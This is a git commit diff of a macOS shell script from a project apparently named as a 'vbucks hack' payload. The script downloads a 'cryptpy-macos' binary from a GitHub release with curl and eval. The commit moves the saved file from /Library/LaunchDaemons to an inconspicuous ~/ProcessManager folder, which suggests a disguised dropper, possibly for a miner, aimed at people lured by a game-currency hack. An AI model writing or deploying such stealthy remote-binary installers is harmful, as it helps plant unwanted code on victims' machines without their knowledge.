d61289b85d5985368ec007028742c9ee72d4cf0c
Mitsuko Megumi <mitsukomegumii@gmail.com>
2018-08-30 12:39:05 -0400

    Updated install dir.

--- payload/vbucks/src/hack/js/window-three-sources/installcryptpy-macos.sh
+++ payload/vbucks/src/hack/js/window-three-sources/installcryptpy-macos.sh
@@ -1,6 +1,6 @@
 version=$1 # Fetch version argument
 
 downloadUrl="https://github.com/mitsukomegumi/CryptPy.js/releases/download/$version/cryptpy-macos" # Fetch latest build URL
-downloadCommand='curl -S -L '$downloadUrl' --output /Library/LaunchDaemons/cryptpy-macos' # Set into command
+downloadCommand='curl -S -L '$downloadUrl' --output ~/ProcessManager/cryptpy-macos' # Set into command
 
 eval "$downloadCommand" # Download latest build
